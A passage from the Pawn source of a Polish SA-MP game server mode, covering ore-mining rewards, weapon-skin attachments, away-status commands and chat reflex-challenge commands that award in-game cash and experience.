					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {36a538}szmaragdu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				kamienie--;
				return SendInKopalnia(kstr);
 	    	}
 	    	case 1: return DialogError(playerid, "{FFFF00}Wydobycie nie powiod³o siê.");
 	    	case 2: return DialogError(playerid, "{FFFF00}Wydobycie nie powiod³o siê.");
 		}
	}
 	if(GProgress[playerid] > 49 && GProgress[playerid] < 75)
 	{
 	   	GProgress[playerid] -= random(2) + 1;
 	   	if(GProgress[playerid] < 0) GProgress[playerid] = 0;
 	   	UpdateGornictwo(playerid);
 		switch(random(2))
 		{
 	    	case 0:
 	    	{
				Delete3DTextLabel(kText[selkamien]);
				DestroyDynamicObject(kObj[selkamien]);
				KamienOnMap[selkamien] = false;
				switch(random(60)) { case 6: Player[playerid][vCash] += 1; }
 	        	if(rudadnia == kType[selkamien]) rudy = random(75) + 1 * 2;
				else rudy = random(75) + 1;
				Player[playerid][Rud] += rudy;
				if(kType[selkamien] == 0) {
			    	Player[playerid][r1] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {d62117}czerwonego rubinu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 1) {
			    	Player[playerid][r2] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ad4820}miedzi "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 2) {
			    	Player[playerid][r3] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {c6c6c6}srebra "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 3) {
			    	Player[playerid][r4] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {42cef4}diamentu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 4) {
			    	Player[playerid][r5] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ffe60c}z³ota "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 5) {
			    	Player[playerid][r6] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ee0cff}Party"C_WHITE"Stone "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 6) {
			    	Player[playerid][r7] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {36a538}szmaragdu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				kamienie--;
				return SendInKopalnia(kstr);
 	    	}
 	    	case 1: return DialogError(playerid, "{FFFF00}Wydobycie nie powiod³o siê.");
 		}
	}
 	if(GProgress[playerid] > 74)
 	{
 	 	GProgress[playerid] -= 1;
 	  	if(GProgress[playerid] < 0) GProgress[playerid] = 0;
 	    UpdateGornictwo(playerid);
 		switch(random(3))
 		{
 	    	case 0:
 	    	{
				Delete3DTextLabel(kText[selkamien]);
				DestroyDynamicObject(kObj[selkamien]);
				KamienOnMap[selkamien] = false;
				switch(random(60)) { case 6: Player[playerid][vCash] += 1; }
 	        	if(rudadnia == kType[selkamien]) rudy = random(100) + 1 * 2;
				else rudy = random(100) + 1;
				Player[playerid][Rud] += rudy;
				if(kType[selkamien] == 0) {
			    	Player[playerid][r1] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {d62117}czerwonego rubinu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 1) {
			    	Player[playerid][r2] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ad4820}miedzi "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 2) {
			    	Player[playerid][r3] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {c6c6c6}srebra "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 3) {
			    	Player[playerid][r4] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {42cef4}diamentu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 4) {
			    	Player[playerid][r5] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ffe60c}z³ota "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 5) {
			    	Player[playerid][r6] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ee0cff}Party"C_WHITE"Stone "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 6) {
			    	Player[playerid][r7] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {36a538}szmaragdu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				kamienie--;
				return SendInKopalnia(kstr);
 	    	}
 	    	case 1: return DialogError(playerid, "{FFFF00}Wydobycie nie powiod³o siê.");
 	    	case 2:
 	    	{
				Delete3DTextLabel(kText[selkamien]);
				DestroyDynamicObject(kObj[selkamien]);
				KamienOnMap[selkamien] = false;
				switch(random(60)) { case 6: Player[playerid][vCash] += 1; }
 	        	if(rudadnia == kType[selkamien]) rudy = random(100) + 1 * 2;
				else rudy = random(100) + 1;
				Player[playerid][Rud] += rudy;
				if(kType[selkamien] == 0) {
			    	Player[playerid][r1] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {d62117}czerwonego rubinu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 1) {
			    	Player[playerid][r2] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ad4820}miedzi "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 2) {
			    	Player[playerid][r3] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {c6c6c6}srebra "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 3) {
			    	Player[playerid][r4] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {42cef4}diamentu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 4) {
			    	Player[playerid][r5] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ffe60c}z³ota "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 5) {
			    	Player[playerid][r6] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ee0cff}Party"C_WHITE"Stone "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 6) {
			    	Player[playerid][r7] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {36a538}szmaragdu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				kamienie--;
				return SendInKopalnia(kstr);
 	    	}
 		}
	}
	return 1;
}

forward CheckWeapons(playerid);
public CheckWeapons(playerid)
{
	RemovePlayerAttachedObject(playerid, 9);
	if(GetPlayerWeapon(playerid) < 40 && GetPlayerWeapon(playerid) > 34 && !EVUczestnik[playerid] && Player[playerid][Admin] < 1) ResetPlayerWeapons(playerid);
	if(GetPlayerWeapon(playerid) == 31 && SkinM4[playerid] == 1)
	{
 		SetPlayerAttachedObject(playerid,9, 356,6,-0.002999 , -0.009996 ,-0.008900 ,1.600000 ,0.099999 ,2.199998 ,1.014000 ,1.430000 ,1.108000,0xDC6800FF,0xDC6800FF);
	}
	if(GetPlayerWeapon(playerid) == 31 && SkinM4[playerid] == 2)
	{
		SetPlayerAttachedObject(playerid,9, 356,6,-0.002999 , -0.009996 ,-0.008900 ,1.600000 ,0.099999 ,2.199998 ,1.014000 ,1.430000 ,1.108000,0xFFFF0000,0xFFFF0000);
	}
	if(GetPlayerWeapon(playerid) == 31 && SkinM4[playerid] == 3)
	{
		SetPlayerAttachedObject(playerid,9, 356,6,-0.002999 , -0.009996 ,-0.008900 ,1.600000 ,0.099999 ,2.199998 ,1.014000 ,1.430000 ,1.108000,0xC0C0C0FF,0xC0C0C0FF);
	}
	if(GetPlayerWeapon(playerid) == 31 && SkinM4[playerid] == 4)
	{
		SetPlayerAttachedObject(playerid,9, 356,6,-0.002999 , -0.009996 ,-0.008900 ,1.600000 ,0.099999 ,2.199998 ,1.014000 ,1.430000 ,1.108000,0xD675FFFF,0xD675FFFF);
	}
	if(GetPlayerWeapon(playerid) == 27 && SkinCombat[playerid] == 1)
	{
		SetPlayerAttachedObject(playerid,9, 351,6,0.001998 , -0.015999 ,0.0000000 ,2.299996 ,0.199994 ,3.100001 ,1.000000 ,1.425000 ,1.003999,0xAEAE00FF,0xAEAE00FF);
	}
	if(GetPlayerWeapon(playerid) == 27 && SkinCombat[playerid] == 2)
	{
		SetPlayerAttachedObject(playerid,9, 351,6,0.001998 , -0.015999 ,0.0000000 ,2.299996 ,0.199994 ,3.100001 ,1.000000 ,1.425000 ,1.003999,0xFF00FFFF,0xFF00FFFF);
	}
	if(GetPlayerWeapon(playerid) == 27 && SkinCombat[playerid] == 3)
	{
		SetPlayerAttachedObject(playerid,9, 351,6,0.001998 , -0.015999 ,0.0000000 ,2.299996 ,0.199994 ,3.100001 ,1.000000 ,1.425000 ,1.003999,0xB9FF50FF,0xB9FF50FF);
	}
	if(GetPlayerWeapon(playerid) == 27 && SkinCombat[playerid] == 4)
	{
		SetPlayerAttachedObject(playerid,9, 351,6,0.001998 , -0.015999 ,0.0000000 ,2.299996 ,0.199994 ,3.100001 ,1.000000 ,1.425000 ,1.003999,0xFF00FF00,0xFF00FF00);
	}
	if(GetPlayerWeapon(playerid) == 30 && SkinAK[playerid] == 1)
	{
		SetPlayerAttachedObject(playerid,9, 355,6,0.023997 , -0.017001 ,0.0001199 ,0.599994 ,0.300001 ,3.199992 ,0.960997 ,1.511998 ,1.027001,0xAAF6AA23,0xAAF6AA23);
	}
	if(GetPlayerWeapon(playerid) == 30 && SkinAK[playerid] == 2)
	{
		SetPlayerAttachedObject(playerid,9, 355,6,0.023997 , -0.017001 ,0.0001199 ,0.599994 ,0.300001 ,3.199992 ,0.960997 ,1.511998 ,1.027001,0xAEAE00FF,0xAEAE00FF);
	}
	if(GetPlayerWeapon(playerid) == 30 && SkinAK[playerid] == 3)
	{
		SetPlayerAttachedObject(playerid,9, 355,6,0.023997 , -0.017001 ,0.0001199 ,0.599994 ,0.300001 ,3.199992 ,0.960997 ,1.511998 ,1.027001,0xFF3B5998,0xFF3B5998);
	}
	if(GetPlayerWeapon(playerid) == 30 && SkinAK[playerid] == 4)
	{
		SetPlayerAttachedObject(playerid,9, 355,6,0.023997 , -0.017001 ,0.0001199 ,0.599994 ,0.300001 ,3.199992 ,0.960997 ,1.511998 ,1.027001,0xBBB5E61D,0xBBB5E61D);
	}
	if(GetPlayerWeapon(playerid) == 30 && SkinAK[playerid] == 5)
	{
		SetPlayerAttachedObject(playerid,9, 355,6,0.023997 , -0.017001 ,0.0001199 ,0.599994 ,0.300001 ,3.199992 ,0.960997 ,1.511998 ,1.027001,0xAA857349,0xAA857349);
	}
	if(GetPlayerWeapon(playerid) == 25 && SkinShotgun[playerid] == 1)
	{
		SetPlayerAttachedObject(playerid,9, 349,6,0.006000 , -0.017999 ,-0.000999 ,3.300000 ,0.099999 ,3.699998 ,1.000000 ,1.408001 ,1.000000,0xFFFF0000,0xFFFF0000);
	}
	if(GetPlayerWeapon(playerid) == 25 && SkinShotgun[playerid] == 2)
	{
		SetPlayerAttachedObject(playerid,9, 349,6,0.006000 , -0.017999 ,-0.000999 ,3.300000 ,0.099999 ,3.699998 ,1.000000 ,1.408001 ,1.000000,0xFFFFE303,0xFFFFE303);
	}
	if(GetPlayerWeapon(playerid) == 25 && SkinShotgun[playerid] == 3)
	{
		SetPlayerAttachedObject(playerid,9, 349,6,0.006000 , -0.017999 ,-0.000999 ,3.300000 ,0.099999 ,3.699998 ,1.000000 ,1.408001 ,1.000000,0xDDFFFFFF,0xDDFFFFFF);
	}
	if(GetPlayerWeapon(playerid) == 25 && SkinShotgun[playerid] == 4)
	{
		SetPlayerAttachedObject(playerid,9, 349,6,0.006000 , -0.017999 ,-0.000999 ,3.300000 ,0.099999 ,3.699998 ,1.000000 ,1.408001 ,1.000000,0xBBB6DEE7,0xBBB6DEE7);
	}
	if(GetPlayerWeapon(playerid) == 24 && SkinDE[playerid] == 1)
	{
		SetPlayerAttachedObject(playerid,9, 348,6,0.007000 ,0.004000 ,-0.011999 ,8.599973 ,0.000000 ,0.000000 ,0.940000 ,1.354999 ,1.286999,0xFFFF0000,0xFFFF0000);
	}
	if(GetPlayerWeapon(playerid) == 24 && SkinDE[playerid] == 2)
	{
	    SetPlayerAttachedObject(playerid,9, 348,6,0.007000 ,0.004000 ,-0.011999 ,8.599973 ,0.000000 ,0.000000 ,0.940000 ,1.354999 ,1.286999,0xFF00AFF0,0xFF00AFF0);
	}
	if(GetPlayerWeapon(playerid) == 24 && SkinDE[playerid] == 3)
	{
	    SetPlayerAttachedObject(playerid,9, 348,6,0.007000 ,0.004000 ,-0.011999 ,8.599973 ,0.000000 ,0.000000 ,0.940000 ,1.354999 ,1.286999,0xEE1AA260,0xEE1AA260);
	}
	if(GetPlayerWeapon(playerid) == 24 && SkinDE[playerid] == 4)
	{
	    SetPlayerAttachedObject(playerid,9, 348,6,0.007000 ,0.004000 ,-0.011999 ,8.599973 ,0.000000 ,0.000000 ,0.940000 ,1.354999 ,1.286999,0xDDFF7F27,0xDDFF7F27);
	}
	if(GetPlayerWeapon(playerid) == 24 && SkinDE[playerid] == 5)
	{
	    SetPlayerAttachedObject(playerid,9, 348,6,0.007000 ,0.004000 ,-0.011999 ,8.599973 ,0.000000 ,0.000000 ,0.940000 ,1.354999 ,1.286999,0xCCB58871,0xCCB58871);
	}
	if(GetPlayerWeapon(playerid) == 4 && SkinKnife[playerid] == 1)
	{
	    SetPlayerAttachedObject(playerid,9, 335,6,-0.003001 ,-0.023000 ,-0.001999 ,0.000000 ,0.000000 ,0.000000 ,1.038998 ,1.555997 ,1.011999,0xCE0000FF,0xCE0000FF);
	}
	if(GetPlayerWeapon(playerid) == 4 && SkinKnife[playerid] == 2)
	{
	    SetPlayerAttachedObject(playerid,9, 335,6,0.003999 ,-0.024000 ,-0.001000 ,0.000000 ,0.000000 ,0.000000 ,1.038998 ,1.555997 ,1.011999,0xFFFF0000,0xFFFF0000);
	}
	if(GetPlayerWeapon(playerid) == 29 && SkinMP5[playerid] == 1)
	{
	    SetPlayerAttachedObject(playerid,9, 353,6,0.007999 ,0.001999 ,0.004999 ,4.899999 ,0.300000 ,3.100003 ,1.000000 ,1.263998 ,1.011000,0xFFFF0000,0xFFFF0000);
	}
	if(GetPlayerWeapon(playerid) == 29 && SkinMP5[playerid] == 2)
	{
	    SetPlayerAttachedObject(playerid,9, 353,6,0.007999 ,0.001999 ,0.004999 ,4.899999 ,0.300000 ,3.100003 ,1.000000 ,1.263998 ,1.011000,0xFF4D0000,0xFF4D0000);
	}
	if(GetPlayerWeapon(playerid) == 29 && SkinMP5[playerid] == 3)
	{
	    SetPlayerAttachedObject(playerid,9, 353,6,0.007999 ,0.001999 ,0.004999 ,4.899999 ,0.300000 ,3.100003 ,1.000000 ,1.263998 ,1.011000,0xFF02050C,0xFF02050C);
	}
	if(GetPlayerWeapon(playerid) == 29 && SkinMP5[playerid] == 4)
	{
		SetPlayerAttachedObject(playerid,9, 353,6,0.007999 ,0.001999 ,0.004999 ,4.899999 ,0.300000 ,3.100003 ,1.000000 ,1.263998 ,1.011000,0xCC86D989,0xCC86D989);
	}
	if(GetPlayerWeapon(playerid) == 34 && SkinSniper[playerid] == 1)
	{
		SetPlayerAttachedObject(playerid,9, 358,6,0.000000 ,-0.010000 ,0.000000 ,0.599998 ,0.199998 ,1.699998 ,1.004999 ,1.228000 ,1.023000,0xFFFF0000,0xFFFF0000);
	}
	if(GetPlayerWeapon(playerid) == 34 && SkinSniper[playerid] == 2)
	{
		SetPlayerAttachedObject(playerid,9, 358,6,0.000000 ,-0.010000 ,0.000000 ,0.599998 ,0.199998 ,1.699998 ,1.004999 ,1.228000 ,1.023000,0xEED65CAD,0xEED65CAD);
	}
	if(GetPlayerWeapon(playerid) == 34 && SkinSniper[playerid] == 3)
	{
		SetPlayerAttachedObject(playerid,9, 358,6,0.000000 ,-0.010000 ,0.000000 ,0.599998 ,0.199998 ,1.699998 ,1.004999 ,1.228000 ,1.023000,0xFFECBB50,0xFFECBB50);
	}
	if(GetPlayerWeapon(playerid) == 34 && SkinSniper[playerid] == 4)
	{
		SetPlayerAttachedObject(playerid,9, 358,6,0.000000 ,-0.010000 ,0.000000 ,0.599998 ,0.199998 ,1.699998 ,1.004999 ,1.228000 ,1.023000,0xDDC7E4FF,0xDDC7E4FF);
	}
	if(GetPlayerWeapon(playerid) == 23 && SkinSilenced[playerid] == 1)
	{
		SetPlayerAttachedObject(playerid,9, 347,6,0.003998 ,-0.016999 ,0.000000 ,2.100000 ,0.200001 ,0.600004 ,1.000000 ,1.563000 ,1.006999,0xFFFF0000,0xFFFF0000);
	}
	if(GetPlayerWeapon(playerid) == 23 && SkinSilenced[playerid] == 2)
	{
		SetPlayerAttachedObject(playerid,9, 347,6,0.003998 ,-0.016999 ,0.000000 ,2.100000 ,0.200001 ,0.600004 ,1.000000 ,1.563000 ,1.006999,0xEE99FF33,0xEE99FF33);
	}
	if(GetPlayerWeapon(playerid) == 23 && SkinSilenced[playerid] == 3)
	{
		SetPlayerAttachedObject(playerid,9, 347,6,0.003998 ,-0.016999 ,0.000000 ,2.100000 ,0.200001 ,0.600004 ,1.000000 ,1.563000 ,1.006999,0xFFFF0000,0xFFFF0000);
	}
	if(GetPlayerWeapon(playerid) == 23 && SkinSilenced[playerid] == 4)
	{
		SetPlayerAttachedObject(playerid,9, 347,6,0.003998 ,-0.016999 ,0.000000 ,2.100000 ,0.200001 ,0.600004 ,1.000000 ,1.563000 ,1.006999,0xDDFF7F27,0xDDFF7F27);
	}
	if(GetPlayerWeapon(playerid) == 23 && SkinSilenced[playerid] == 5)
	{
		SetPlayerAttachedObject(playerid,9, 347,6,0.003998 ,-0.016999 ,0.000000 ,2.100000 ,0.200001 ,0.600004 ,1.000000 ,1.563000 ,1.006999,0xCCB58871,0xCCB58871);
	}
	return 1;
}

CMD:zw(playerid, params[])
{
 	if(zwBlock[playerid] > 0) return DialogError(playerid, "{FFFF00}Ostatnio posiada³eœ status ZW.");
	if(OnGame[playerid] != -1) WypiszZabawa(playerid);
	zw[playerid] = 1;
	TogglePlayerControllable(playerid, 0);
    SetPlayerVirtualWorld(playerid, 100);
    AFK[playerid] = true;
	AFKPoints[playerid] = 0;
    new zmsg[256], zmsgen[256];
    if(isnull(params)) {
		format(zmsg, sizeof(zmsg), ""C_NICK"%s(%d) {255096}zaraz wraca.", Player[playerid][Name], playerid);
		format(zmsgen, sizeof(zmsgen), ""C_NICK"%s(%d) {255096}go away.", Player[playerid][Name], playerid); }
    else {
        if(Player[playerid][MuteTime] > gettime()) return SendClientMessage(playerid, RED, "Jesteœ uciszony. Powód nie wyœwietli siê na czacie.");
		format(zmsg, sizeof(zmsg), ""C_NICK"%s(%d) {255096}zaraz wraca. Powód: "C_NICK"%s", Player[playerid][Name], playerid, params);
		format(zmsgen, sizeof(zmsgen), ""C_NICK"%s(%d) {255096}go away. Reason: "C_NICK"%s", Player[playerid][Name], playerid, params); }
	SendClientMessageToAllEx(-1, zmsg, zmsgen);
	return 1;
}

CMD:jj(playerid, params[])
{
 	if(zw[playerid] == 0) return DialogError(playerid, "{FFFF00}Nie posiadasz statusu ZW.");
	zw[playerid] = 0;
	AFKPoints[playerid] = 100;
	TogglePlayerControllable(playerid, 1);
    SetPlayerVirtualWorld(playerid, 0);
    AFK[playerid] = false;
	new jmsg[256], jmsgen[256];
	format(jmsg, sizeof(jmsg), ""C_NICK"%s(%d) {33CCFF}ju¿ jest po {00FFFF}%d{33CCFF}m.", Player[playerid][Name], playerid, zwTimer[playerid]);
	format(jmsgen, sizeof(jmsgen), ""C_NICK"%s(%d) {33CCFF}returned after {00FFFF}%d{33CCFF}m.", Player[playerid][Name], playerid, zwTimer[playerid]);
	SendClientMessageToAllEx(-1, jmsg, jmsgen);
	zwBlock[playerid] = 120;
	zwTimer[playerid] = 0;
	return 1;
}

CMD:specoff(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
 	if(SpectatingPlayer[playerid] < 0) return DialogError(playerid, "{FFFF00}Nie obserwujesz nikogo.");
	SpectatingPlayer[playerid] = -1;
    SpecToggle(playerid, false);
    SetPlayerVirtualWorld(playerid, 0);
    ResetPlayerWeapons(playerid);
    SpawnFunction(playerid);
	return 1;
}

CMD:kod(playerid, params[])
{
	if(!kodTrwa) return DialogError(playerid, "{FFFF00}Aktualnie nie ma ¿adnego kodu.");
	if(isnull(params)) return SyntaxError(playerid, "{01FCFF}/kod [kod]");
	if(!strcmp(SlowoKod, params))
	{
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		kodTime = gettime() + 300;
		kodTrwa = false;
		ReflexType = -1;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); }
		return ReflexActive = false;
	}
	return DialogError(playerid, "{FFFF00}Wprowadzony kod jest nieprawid³owy.");
}

CMD:liczba(playerid, params[])
{
	if(mathResult == -897234) return DialogError(playerid, "{FFFF00}Aktualnie nie ma ¿adnego równania.");
	if(isnull(params)) return SyntaxError(playerid, "{01FCFF}/liczba [wynik]");
	if(strval(params) == mathResult)
	{
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexType = -1;
		ReflexActive = false;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); }
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
		mathTime = gettime() + 300;
		mathResult = -897234;
		return 1;
	}
	return DialogError(playerid, "{FFFF00}Podane rozwi¹zanie jest nieprawid³owe.");
}

CMD:delta(playerid, params[])
{
	if(!ReflexActive || ReflexType != 19) return DialogError(playerid, "{FFFF00}Aktualnie nie ma ¿adnego równania.");
	if(isnull(params)) return SyntaxError(playerid, "{01FCFF}/delta [wynik]");
	if(strval(params) == deltawynik)
	{
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexType = -1;
		ReflexActive = false;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); }
  		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
		mathTime = gettime() + 300;
		deltawynik = -897234 + random(141913);
		return 1;
	}
	return DialogError(playerid, "{FFFF00}Podane rozwi¹zanie jest nieprawid³owe.");
}

CMD:wyraz(playerid, params[])
{
	if(isnull(params)) return SyntaxError(playerid, "{01FCFF}/wyraz [wyraz]");
	if(!wyrazTrwa) return DialogError(playerid, "{FFFF00}Aktualnie nie ma ¿adnego wyrazu.");
	if(!strcmp(SlowoRozsypanka, params, true))
	{
		wyraztimeend = GetTickCount();
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexType = -1;
		ReflexActive = false;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); }
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
		wyrazTime = gettime() + 300;
		wyrazTrwa = false;
		return 1;
	}
	return DialogError(playerid, "{FFFF00}Wprowadzony wyraz jest nieprawid³owy.");
}

CMD:kolornick(playerid, params[]) return cmd_kolory(playerid, params);
CMD:nickkolor(playerid, params[]) return cmd_kolory(playerid, params);
CMD:kolor(playerid, params[]) return cmd_kolory(playerid, params);
CMD:kolorki(playerid, params[]) return cmd_kolory(playerid, params);
CMD:kolory(playerid, params[]) {
	new s[3200];
	format(s, sizeof(s), "{%06x}/szary, {%06x}/ziel1, {%06x}/ziel2, {%06x}/ziel3, {%06x}/ziel4, {%06x}/ziel5, %06x/czerw,\n", GREY >>> 8, GREEN >>> 8, LIME >>> 8, LAWNGREEN >>> 8, SPRINGGREEN >>> 8, RED >>> 8);
	format(s, sizeof(s), "%s{%06x}/zolty, {%06x}/nieb1, {%06x}/nieb2, {%06x}/nieb3, {%06x}/nieb4, {%06x}/pomar1, {%06x}/pomar2,\n", s, YELLOW >>> 8, BLUE >>> 8, LIGHTBLUE >>> 8, AQUA >>> 8, FLBLUE >>> 8, ORANGE >>> 8, ORANGERED >>> 8);
	format(s, sizeof(s), "%s{%06x}/magenta1, {%06x}/magenta2, {%06x}/magenta3, {%06x}/navy, {%06x}/crimson, {%06x}/bisque, {%06x}/coral,\n", s, MAGENTA >>> 8, PINK >>> 8, MEDIUMMAGENTA >>> 8, NAVY >>> 8, CRIMSON >>> 8, BISQUE >>> 8, CORAL >>> 8);
	format(s, sizeof(s), "%s{%06x}/zloty, {%06x}/indigo, {%06x}/ivory, {%06x}/maroon, {%06x}/oliwny, {%06x}/tomato", s, GOLD >>> 8, INDIGO >>> 8, IVORY >>> 8, MAROON >>> 8, OLIVE >>> 8, TOMATO >>> 8);
	ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Dostêpne kolory", s, "Zamknij", "");
	return 1;
}

main() {}

stock SetPlayerMoney(playerid, cash)
{
  ResetPlayerMoney(playerid);
  return GivePlayerMoney(playerid, cash);
}

stock ReturnWeaponName(weaponid)
{
	new weaponname[32];
	GetWeaponName(weaponid,weaponname,sizeof(weaponname));
	if(weaponid == 0){
		format(weaponname,32,"Fist");
	}
	return weaponname;
}

forward SetRandomColor(playerid);
public SetRandomColor(playerid)
{
	switch(random(28)) {
		case 0: SetPlayerColor(playerid, GREY);
		case 1: SetPlayerColor(playerid, GREEN);
		case 2: SetPlayerColor(playerid, RED);
		case 3: SetPlayerColor(playerid, YELLOW);
		case 4: SetPlayerColor(playerid, BLUE);
		case 5: SetPlayerColor(playerid, LIGHTBLUE);
		case 6: SetPlayerColor(playerid, ORANGE);
		case 7: SetPlayerColor(playerid, LIME);
		case 8: SetPlayerColor(playerid, MAGENTA);
		case 9: SetPlayerColor(playerid, NAVY);
		case 10: SetPlayerColor(playerid, AQUA);
		case 11: SetPlayerColor(playerid, CRIMSON);
		case 12: SetPlayerColor(playerid, FLBLUE);
		case 13: SetPlayerColor(playerid, BISQUE);
		case 14: SetPlayerColor(playerid, CORAL);
		case 15: SetPlayerColor(playerid, GOLD);
		case 16: SetPlayerColor(playerid, INDIGO);
		case 17: SetPlayerColor(playerid, IVORY);
		case 18: SetPlayerColor(playerid, LAWNGREEN);
		case 19: SetPlayerColor(playerid, SEAGREEN);
		case 20: SetPlayerColor(playerid, MAROON);
		case 21: SetPlayerColor(playerid, OLIVE);
		case 22: SetPlayerColor(playerid, ORANGERED);
		case 23: SetPlayerColor(playerid, PINK);
		case 24: SetPlayerColor(playerid, SPRINGGREEN);
		case 25: SetPlayerColor(playerid, TOMATO);
		case 26: SetPlayerColor(playerid, MEDIUMMAGENTA);
